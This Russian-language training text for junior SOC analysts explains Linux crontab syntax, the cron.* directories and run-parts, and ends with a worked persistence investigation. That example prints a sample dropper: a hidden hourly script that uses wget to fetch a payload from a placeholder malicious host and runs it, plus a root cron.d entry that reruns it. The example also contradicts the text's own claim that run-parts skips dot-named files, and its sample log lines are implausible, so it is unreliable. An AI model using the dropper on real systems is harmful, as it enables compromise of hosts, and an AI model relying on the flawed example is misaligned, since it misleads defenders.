# Планировщик задач Linux: crontab пользователя и каталоги `cron.*`

## 1. Контекст и базовые понятия: где искать запланированные задания в Linux

Планировщик задач `cron` — стандартный демон фонового выполнения периодических заданий в Unix/Linux-системах. С точки зрения SOC L1 `cron` является одной из наиболее популярных точек закрепления (persistence) злоумышленников, поэтому инвентаризация и анализ всех мест, где могут быть описаны задания, — обязательная рутинная операция.

В современных дистрибутивах (Ubuntu, Debian, Rocky Linux, Fedora, RHEL) задания `cron` размещаются в нескольких принципиально разных локациях. Для специалиста по кибербезопасности важно чётко разграничивать пользовательские crontab-файлы и системные каталоги `cron.*`, поскольку они имеют различный синтаксис, права доступа и порядок обработки демоном [Cronitor: The 5 places cron jobs are saved](https://cronitor.io/guides/five-places-for-cron-jobs).

**Ключевые определения**

- **`cron` / `crond`** — демон, запускаемый при старте системы, каждую минуту проверяет файлы заданий и выполняет те, чьё расписание совпало с текущим моментом.
- **Crontab** (cron table) — текстовый файл, содержащий строки вида «расписание + команда». Применяется как имя файла, так и название утилиты для управления этим файлом.
- **Пользовательский crontab** — файл, привязанный к конкретному пользователю. Задания выполняются с правами этого пользователя. Хранится в `/var/spool/cron/crontabs/<username>` (в некоторых системах — `/var/spool/cron/<username>`).
- **Системные каталоги `cron.*`** — директории `/etc/cron.hourly`, `/etc/cron.daily`, `/etc/cron.weekly`, `/etc/cron.monthly`, куда размещаются исполняемые скрипты (не crontab-строки!), выполняемые демоном с правами root через механизм `run-parts`.
- **Системный crontab `/etc/crontab`** — файл, аналогичный пользовательскому, но содержащий дополнительное поле имени пользователя, от которого запускается команда. Редактируется только администратором, без использования команды `crontab`.
- **Дроп-ин каталог `/etc/cron.d`** — директория для отдельных файлов в формате, аналогичном `/etc/crontab` (с обязательным полем пользователя). Используется пакетами приложений для добавления системных заданий.

**Сравнение локаций запланированных заданий**

В таблице ниже сведены пять основных мест, в которых могут находиться cron-задачи. Такое разделение критически важно при аудите: упущение любого из них может привести к пропуску вредоносного персистентного механизма.

| Локация | Владелец / доступ | Формат записи | Поле пользователя обязательно? | Типичное назначение |
|---------|-------------------|---------------|-------------------------------|---------------------|
| `/var/spool/cron/crontabs/<user>` | Пользователь, группа crontab; редактируется через `crontab -e` | 5 полей времени + команда | Нет | Индивидуальные задачи пользователей |
| `/etc/crontab` | root (изменяется текстовым редактором) | 5 полей времени + пользователь + команда | Да | Общесистемные задания, которые удобно держать в одном файле |
| `/etc/cron.d/*` | root; файлы без расширения, без точки в имени | 5 полей времени + пользователь + команда, могут задаваться переменные окружения | Да | Децентрализованные системные задания, добавляемые пакетами (например, certbot, sysstat) |
| Каталоги `cron.hourly`, `cron.daily`, `cron.weekly`, `cron.monthly` | root; размещаются исполняемые скрипты | Не содержит crontab-строк, только скрипт (bash, python и т.п.) | Нет (всегда запускается от root через `run-parts`) | Задания, не требующие точной минуты запуска; удобны для простых сценариев обслуживания |
| `/etc/cron.d/0hourly` (в Fedora/RHEL) / аналогичная запись в `/etc/crontab` (Debian/Ubuntu) | root | Стандартный crontab-формат, инициирующий `run-parts /etc/cron.hourly` | Да | Инфраструктурная запись, активирующая выполнение скриптов из каталогов `cron.*` |

Источник: [Cronitor: The 5 places cron jobs are saved](https://cronitor.io/guides/five-places-for-cron-jobs), [Webdock: How to configure Crontab on Linux](https://webdock.io/en/docs/how-guides/system-maintenance/how-configure-crontab-linux), [OneUptime: /etc/crontab vs User Crontabs](https://oneuptime.com/blog/post/2026-03-02-how-to-understand-etc-crontab-vs-user-crontabs-on-ubuntu/view).

Специалисту SOC L1 важно помнить: пользовательские crontab-файлы не следует редактировать в обход утилиты `crontab`, поскольку это может привести к тому, что демон не перечитает изменения до следующей минуты или вовсе проигнорирует некорректно отформатированный файл. Напротив, файлы в `/etc/cron.d` и сам `/etc/crontab` мониторятся демоном напрямую, но требуют корректного синтаксиса (включая поле пользователя) и правильного имени файла (без точки), иначе cron молча их пропустит.

## 2. Внутреннее устройство: формат crontab-файла и инфраструктура каталогов `cron.*`

Второй аспект темы — как устроены файлы и каталоги планировщика изнутри, чтобы аналитик мог читать записи, распознавать аномалии и понимать, как cron выполняет задания на системном уровне.

### 2.1 Пользовательский crontab: поля и синтаксис

Пользовательский crontab состоит из строк, каждая из которых определяет одно задание. Строка содержит пять полей даты/времени и команду:

```
*    *    *    *    *  /путь/к/команде
|    |    |    |    |
|    |    |    |    +-- День недели (0-7, где 0 и 7 = воскресенье; допускаются имена: sun,mon,tue...)
|    |    |    +------- Месяц (1-12 или jan,feb,mar...)
|    |    +------------ День месяца (1-31)
|    +----------------- Час (0-23)
+---------------------- Минута (0-59)
```

**Допустимые значения и специальные символы**

| Поле | Допустимые значения | Специальные символы |
|------|---------------------|---------------------|
| Минута (min) | 0–59 | `*` (каждое значение), `*/N` (каждые N минут), `,` (перечисление), `-` (диапазон) |
| Час (hour) | 0–23 | `*`, `*/N` (каждые N часов), `,`, `-` |
| День месяца (dom) | 1–31 | `*`, `*/N`, `,`, `-` |
| Месяц (month) | 1–12 или jan–dec | `*`, `*/N`, `,`, `-`, имена |
| День недели (dow) | 0–7 (0 и 7 — воскресенье) или sun–sat | `*`, `*/N`, `,`, `-`, имена |

Источник: [crontab(5) man page](https://man7.org/linux/man-pages/man5/crontab.5.html), [Stackscale: cron and crontab](https://www.stackscale.com/blog/cron-crontab-linux).

**Особенности интерпретации**

- Звёздочка (`*`) означает «любое значение». Например, `* в поле часа` = каждый час.
- `*/5` в поле минут означает «каждые 5 минут» (0,5,10,...).
- Запятые перечисляют конкретные значения: `1,3,5` в поле дней недели — понедельник, среда, пятница.
- Дефис задаёт диапазон: `9-17` в поле часов — с 9 до 17 включительно.
- Если заданы и день месяца, и день недели (не `*`), то срабатывает логика «ИЛИ»: задание выполняется в оба указанных дня. Например, `0 0 1 * 1` — в полночь каждого 1-го числа И каждого понедельника.

В системном crontab `/etc/crontab` и в файлах каталога `/etc/cron.d` после пяти полей времени добавляется шестое поле — имя пользователя, от которого выполняется команда. Это обязательное поле, отсутствие которого приводит к синтаксической ошибке. В пользовательском crontab оно отсутствует, так как пользователь однозначно определён владельцем файла.

**Предопределённые ярлыки времени**

Для удобства вместо пяти полей можно использовать специальные строки с префиксом `@`:

| Ярлык | Эквивалентное расписание |
|-------|--------------------------|
| `@reboot` | Запуск однократно при загрузке системы |
| `@yearly` / `@annually` | `0 0 1 1 *` |
| `@monthly` | `0 0 1 * *` |
| `@weekly` | `0 0 * * 0` |
| `@daily` / `@midnight` | `0 0 * * *` |
| `@hourly` | `0 * * * *` |

Источник: [crontab(5) man page](https://man7.org/linux/man-pages/man5/crontab.5.html).

### 2.2 Каталоги `cron.*` и механизм `run-parts`

Каталоги `/etc/cron.hourly`, `/etc/cron.daily`, `/etc/cron.weekly` и `/etc/cron.monthly` не содержат строк в формате crontab. Вместо этого в них размещаются исполняемые файлы (скрипты или бинарные файлы), которые запускаются специальной программой `run-parts`. Демон `cron` не сканирует эти каталоги напрямую — для их активации используется одна или несколько записей в системном crontab.

В Debian/Ubuntu типичная запись в `/etc/crontab` выглядит так:

```
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

А для `/etc/cron.hourly` в том же файле (либо в `/etc/cron.d/0hourly` в Fedora/RHEL) присутствует строка:

```
01 *    * * *   root    run-parts /etc/cron.hourly
```

(Эта иллюстративная схема основана на выводе `head /etc/crontab`, приведённом в [Cronitor: The 5 places](https://cronitor.io/guides/five-places-for-cron-jobs) и [Opensource.com](https://opensource.com/article/17/11/how-use-cron-linux). Фактические минуты могут различаться в зависимости от дистрибутива.)

Таким образом, иерархия запуска выглядит следующим образом:

```text
cron daemon (каждую минуту)
│
├── /var/spool/cron/crontabs/<user> ──► задания пользователя
├── /etc/crontab ──► системные задания, в т.ч. вызов run-parts для cron.daily/weekly/monthly
├── /etc/cron.d/* ──► дополнительные системные задания
│
└── (запись в /etc/crontab или /etc/cron.d/0hourly)
       └── run-parts /etc/cron.hourly ──► все скрипты в каталоге
```

Программа `run-parts` выполняет все исполняемые файлы в указанном каталоге в лексикографическом порядке, игнорируя файлы с определёнными суффиксами (например, `.dpkg-dist`, `.disabled`) и те, у которых имя содержит точку. Это поведение важно учитывать при анализе: скрипт с именем `backup.sh` будет пропущен, если он лежит в `/etc/cron.daily` напрямую, так как `run-parts` по умолчанию игнорирует имена с точкой (зависит от версии, но обычно да). Безопаснее использовать имя без расширения и установить бит выполнения.

### 2.3 Контроль доступа к cron

Доступ пользователей к созданию собственного crontab может ограничиваться администратором через файлы `/etc/cron.allow` и `/etc/cron.deny` (или `cron.deny`). Если существует `/etc/cron.allow`, только перечисленные в нём пользователи могут использовать `crontab`. Если существует только `/etc/cron.deny`, всем, кроме указанных в нём, использование разрешено. Пустой `cron.deny` разрешает всем. Для root запрет не действует.

С точки зрения SOC L1 проверка содержимого этих файлов помогает оценить, кто в системе мог легитимно или нелегитимно добавить задание. Злоумышленник с правами root может удалить себя из deny-листов или добавить в allow, поэтому аудит этих файлов — часть стандартной процедуры.

## 3. Применение и работа: управление пользовательским crontab и каталогами `cron.*`

### 3.1 Операции с пользовательским crontab

Основная утилита — `crontab`. Она позволяет просматривать, редактировать и удалять пользовательский crontab-файл, а также работать с crontab других пользователей (при наличии прав root).

**Просмотр своего crontab**
```bash
crontab -l
```
Выводит список всех заданий текущего пользователя. Если crontab пуст, обычно выводится сообщение `no crontab for <user>` (зависит от реализации).

**Просмотр чужого crontab (требует root)**
```bash
sudo crontab -u username -l
```
Вместо `username` подставляется целевая учётная запись. Этот механизм часто используется при аудите всех пользовательских задач на хосте.

**Редактирование своего crontab**
```bash
crontab -e
```
Открывает crontab-файл в редакторе, заданном переменными `VISUAL` или `EDITOR` (по умолчанию vi). При сохранении и выходе утилита проверяет синтаксис, уведомляет cron о необходимости перечитать файл и, в большинстве реализаций, выполняет фиксацию только при корректном формате. Прямое редактирование файлов в `/var/spool/cron/crontabs/` не рекомендуется, так как изменения могут быть не замечены демоном.

**Удаление своего crontab**
```bash
crontab -r
```
Удаляет все задания пользователя без подтверждения. Для предотвращения случайного удаления рекомендуется использовать `crontab -r -i` (интерактивный запрос).

**Создание задания (практический пример)**

Допустим, нужно каждые 30 минут выполнять скрипт мониторинга доступности веб-сервера от имени пользователя `monitor`:

```bash
crontab -e -u monitor
```
Добавляем строку:
```
*/30 * * * * /usr/local/bin/check_website.sh
```
После сохранения задание вступит в силу в ближайшую минуту.

**Особенности окружения**

Пользовательский crontab выполняется с минимальным набором переменных окружения (обычно `HOME`, `LOGNAME`, `SHELL=/bin/sh`, `PATH=/usr/bin:/bin`). Поэтому в командах следует указывать полные пути к исполняемым файлам и файлам данных либо явно задать переменную `PATH` в начале crontab-файла:

```
PATH=/usr/local/bin:/usr/bin:/bin
*/30 * * * * check_website.sh
```

Источник: [Webdock: How to configure Crontab](https://webdock.io/en/docs/how-guides/system-maintenance/how-configure-crontab-linux), [OneUptime: User crontab](https://oneuptime.com/blog/post/2026-03-02-how-to-understand-etc-crontab-vs-user-crontabs-on-ubuntu/view).

### 3.2 Работа с каталогами `cron.*`

Добавление системного задания в каталог `cron.hourly`, `cron.daily`, `cron.weekly` или `cron.monthly` сводится к размещению исполняемого скрипта с корректным именем (без точки) и правами доступа.

**Размещение скрипта в `cron.daily`**

Пример: скопировать готовый скрипт резервного копирования и установить права:

```bash
sudo cp /opt/scripts/backup.sh /etc/cron.daily/backup
sudo chmod 755 /etc/cron.daily/backup
```

Важно переименовать файл, убрав расширение `.sh`, так как `run-parts` по умолчанию игнорирует файлы с точкой в имени. Также нужно убедиться, что скрипт не требует интерактивного ввода и корректно работает в неинтерактивной среде.

**Проверка выполнения**

Время запуска скриптов из `cron.daily`, `cron.weekly`, `cron.monthly` определяется соответствующими записями в `/etc/crontab`. В Debian/Ubuntu по умолчанию это 6:25 утра для daily, 6:47 в воскресенье для weekly, 6:52 первого числа месяца для monthly. Скрипты из `cron.hourly` запускаются в 1-ю минуту каждого часа (зависит от дистрибутива). При наличии `anacron` (в системах, которые не работают 24/7) он может дополнительно гарантировать запуск пропущенных заданий.

**Аудит с точки зрения безопасности**

При проверке хоста на предмет персистентности злоумышленника следует:

1. Просмотреть содержимое всех четырёх каталогов: `ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.d`.
2. Убедиться, что владелец и группа каждого скрипта — root, а права не допускают запись посторонними (`chmod 755` или более строгие).
3. Проанализировать содержимое скриптов на предмет вызовов подозрительных URL, загрузки файлов из `/tmp` или `/dev/shm`, обращений к нестандартным портам.
4. Проверить наличие скрытых файлов (начинающихся с точки) — они не будут выполнены `run-parts`, но могут быть признаком попытки маскировки.

### 3.3 Поиск следов выполнения cron-задач в логах

Демон `cron` протоколирует каждый запуск задания через `syslog`. В системах с journald логи также доступны через `journalctl`. Типичная запись:

```
Aug 5 4:05:01 dev01 CRON[2128]: (ubuntu) CMD (/var/cronitor/database-backup.sh)
```

Формат: дата, хост, `CRON[PID]: (username) CMD (команда)`. При расследовании инцидентов команда

```bash
grep CRON /var/log/syslog
```
или
```bash
journalctl -u cron
```
позволяет восстановить хронологию запусков и сопоставить с подозрительными заданиями. Отсутствие логов может указывать на попытку заметания следов (очистка логов, использование атаки типа logrotate abuse).

Источник: [Cronitor: The 5 places](https://cronitor.io/guides/five-places-for-cron-jobs), [Fedora Discussion](https://discussion.fedoraproject.org/t/cron-configuration-files-and-directories/73042).

## 4. Сквозной практический пример: обнаружение подозрительных заданий при реагировании на инцидент

**Исходные условия.** Младший аналитик SOC L1 получил уведомление о подозрительной сетевой активности с Linux-хоста `web-01`, работающего под Ubuntu 22.04. Администратор сообщил, что на хосте нет легитимных пользовательских cron-заданий, а системные скрипты в каталогах `cron.*` должны быть стандартными. Требуется проверить все места размещения cron-задач и найти возможный механизм закрепления.

### Шаг 1. Проверка crontab текущего пользователя и root

Аналитик заходит на хост под своей учётной записью и проверяет crontab от имени непривилегированного пользователя, а затем рута.

```bash
crontab -l
```

Ожидаемый вывод: `no crontab for analyst`. (Значения зависят от среды, здесь — схематический пример.)

Далее запрашивается crontab root:

```bash
sudo crontab -l -u root
```

Вывод (иллюстративная схема):
```
no crontab for root
```

Оба вывода пусты, что соответствует исходной информации об отсутствии легитимных задач. Однако это не исключает наличия заданий в системных каталогах.

### Шаг 2. Инвентаризация системных каталогов и /etc/cron.d

Проверяются все стандартные директории на наличие необычных скриптов.

```bash
ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.d
```

Иллюстративный фрагмент вывода (схематически):
```
/etc/cron.hourly:
-rwxr-xr-x 1 root root 132 Mar 15 10:01 .update-check
-rwxr-xr-x 1 root root 512 Feb 28 14:30 logrotate

/etc/cron.daily:
-rwxr-xr-x 1 root root 204 Mar 15 10:01 man-db
-rwxr-xr-x 1 root root 312 Mar 15 10:01 update-notifier-common

/etc/cron.weekly:
...

/etc/cron.monthly:
...

/etc/cron.d:
-rw-r--r-- 1 root root 101 Mar 15 10:01 anacron
-rw-r--r-- 1 root root 135 Mar 15 10:01 e2scrub_all
-rw-r--r-- 1 root root 178 Mar 15 10:01 .system-sync
```

Аномалии: в `/etc/cron.hourly` присутствует файл `.update-check` с ведущей точкой (скрытый), владельцем root и правами выполнения. В `/etc/cron.d` — файл `.system-sync` (с точкой в имени), который формально должен игнорироваться демоном согласно многим реализациям (но это зависит от версии cron; в некоторых устраняются только определённые расширения). Тем не менее, это нестандартно и требует анализа.

### Шаг 3. Анализ подозрительного скрипта

Аналитик просматривает содержимое скрытого файла в `/etc/cron.hourly`:

```bash
cat /etc/cron.hourly/.update-check
```

Пример содержимого (иллюстративная схема):
```bash
#!/bin/bash
# System update helper
wget -q -O /tmp/.upd http://<malicious-host>/payload && bash /tmp/.upd
```

Здесь команда `wget` загружает файл с внешнего хоста в скрытый временный файл и немедленно исполняет его — классический дроппер. В реальном расследовании URL будет принадлежать C2-инфраструктуре.

Затем проверяется файл в `/etc/cron.d`:

```bash
cat /etc/cron.d/.system-sync
```

Содержимое (схема):
```
*/5 * * * * root /usr/bin/nohup /tmp/.upd > /dev/null 2>&1 &
```

Файл с точкой может быть проигнорирован демоном, но если он обработан (например, старая версия cronie или некорректно скомпилированный демон), то раз в 5 минут будет выполняться загруженный ранее файл `/tmp/.upd`. Даже если демон игнорирует этот файл, он является свидетельством попытки закрепления.

### Шаг 4. Проверка логов выполнения cron

Для подтверждения, что вредоносное задание реально выполнялось, аналитик извлекает записи из syslog:

```bash
grep 'CRON' /var/log/syslog | tail -20
```

Результат (схематично):
```
Aug  5 17:00:01 web-01 CRON[12345]: (root) CMD ( run-parts /etc/cron.hourly )
Aug  5 17:00:01 web-01 CRON[12346]: (root) CMD ( /usr/bin/nohup /tmp/.upd > /dev/null 2>&1 & )
Aug  5 17:00:02 web-01 CRON[12347]: (root) CMD ( wget -q -O /tmp/.upd http://<malicious-host>/payload && bash /tmp/.upd )
```

Логи демонстрируют, что `run-parts` запустил все скрипты из `/etc/cron.hourly`, включая вредоносный `.update-check`, а также (в зависимости от конфигурации) могло сработать задание из `.system-sync`. Наличие двух записей с интервалом в секунду подтверждает активность злоумышленника.

**Действия по результатам.** Аналитик документирует находки, удаляет вредоносные файлы, отключает crontab пользователя (если таковой существовал), проверяет другие узлы на аналогичные индикаторы компрометации, блокирует индикатор URL на межсетевом экране. Инцидент эскалируется на L2 для углублённого анализа загруженного payload.

**Вывод примера.** Сквозной кейс демонстрирует практическое применение знаний о пользовательском crontab и каталогах `cron.*` в ходе типовой задачи SOC L1: умение быстро проверить все возможные локации запланированных задач и отличить легитимные файлы от подозрительных является ключевым навыком при выявлении бэкдоров и механизмов persistence.
